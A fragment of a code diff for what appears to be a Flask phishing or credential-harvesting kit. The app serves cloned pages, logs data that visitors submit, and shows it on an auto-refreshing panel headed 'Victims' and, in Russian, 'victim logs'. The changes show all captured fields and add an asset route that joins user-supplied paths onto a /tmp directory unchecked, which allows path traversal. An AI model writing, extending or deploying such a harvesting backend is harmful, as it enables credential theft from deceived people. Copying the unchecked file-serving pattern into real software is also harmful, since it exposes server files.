         host = request.host_url.rstrip('/')
         return jsonify({
             'id': pid, 'url': host + '/p/' + pid, 'download': host + '/api/download/' + pid,
-            'panel': host + '/panel/' + pid, 'logs': host + '/api/logs/' + pid,
-            'assets': 1, 'forms': 1
+            'panel': host + '/panel/' + pid, 'assets': assets, 'forms': forms
         })
     except Exception as e:
         return jsonify({'error': str(e)[:200]}), 500
@@ -465,11 +405,11 @@ def serve_page(pid):
     if os.path.exists(path): return open(path, encoding='utf-8').read()
     return 'Not found', 404
 
-@app.route('/p/<pid>/assets/<name>')
-def serve_asset(pid, name):
-    path = '/tmp/' + pid + '/assets/' + name
+@app.route('/p/<pid>/<path:filename>')
+def serve_assets(pid, filename):
+    path = '/tmp/' + pid + '/' + filename
     if os.path.exists(path):
-        ct = 'text/css' if name.endswith('.css') else 'application/javascript' if name.endswith('.js') else 'image/png'
+        ct = 'text/css' if filename.endswith('.css') else 'application/javascript' if filename.endswith('.js') else 'image/png' if filename.endswith('.png') else 'image/jpeg'
         return open(path, 'rb').read(), 200, {'Content-Type': ct}
     return 'Not found', 404
 
@@ -481,31 +421,25 @@ def submit_data(pid):
     data['time'] = time.strftime('%Y-%m-%d %H:%M:%S')
     if pid in PROJECTS: PROJECTS[pid].setdefault('logs', []).append(data)
     with open('/tmp/' + pid + '/logs.json', 'a') as f: f.write(json.dumps(data) + '\n')
-    redirect_to = PROJECTS.get(pid, {}).get('url', 'https://google.com')
-    return '<script>window.location.href="' + redirect_to + '";</script>'
+    return jsonify({'status': 'ok'})
 
 # ========== LOGS PANEL ==========
 @app.route('/panel/<pid>')
 def panel(pid):
     logs = PROJECTS.get(pid, {}).get('logs', [])
     log_html = ''
-    for l in logs[-20:]:
-        log_html += '<div style="background:#111;padding:8px;margin:4px 0;border-radius:5px;font-size:12px;font-family:monospace">'
+    for l in logs[-30:]:
+        log_html += '<div style="background:#111;padding:10px;margin:5px 0;border-radius:8px;font-size:13px;font-family:monospace">'
         for k, v in l.items():
-            if k != 'ua': log_html += '<span style="color:#ff0">' + k + ':</span> <span style="color:#0ff">' + str(v) + '</span> '
+            log_html += '<span style="color:#ff0">' + k + ':</span> <span style="color:#0ff">' + str(v) + '</span><br>'
         log_html += '</div>'
     
     return '''<!DOCTYPE html>
-<html><head><meta charset="UTF-8"><title>Logs</title>
-<style>*{margin:0;padding:0}body{background:#0a0a0f;color:#0f0;font-family:monospace;padding:20px}h1{border-bottom:1px solid #333;padding-bottom:10px;margin-bottom:15px;font-size:20px}.count{color:#f00;font-size:24px}</style>
+<html><head><meta charset="UTF-8"><title>Логи</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>*{margin:0;padding:0}body{background:#0a0a0f;color:#0f0;font-family:monospace;padding:20px}h1{font-size:18px;margin-bottom:10px}.count{color:#f00;font-size:28px;margin-bottom:15px}.empty{color:#666;text-align:center;margin-top:50px}</style>
 <script>setInterval(function(){location.reload()},5000)</script></head>
-<body><h1>LOGS | ''' + pid + '''</h1><div class="count">Victims: ''' + str(len(logs)) + '''</div><br>''' + (log_html or '<p style="color:#666">Waiting...</p>') + '''</body></html>'''
-
-# ========== LOGS API ==========
-@app.route('/api/logs/<pid>')
-def api_logs(pid):
-    logs = PROJECTS.get(pid, {}).get('logs', [])
-    return jsonify({'logs': logs, 'count': len(logs)})
+<body><h1>ЛОГИ ЖЕРТВ</h1><div class="count">Всего: ''' + str(len(logs)) + '''</div>''' + (log_html or '<div class="empty">Ожидание...</div>') + '''</body></html>'''
 
 # ========== DOWNLOAD ==========
 @app.route('/api/download/<pid>')
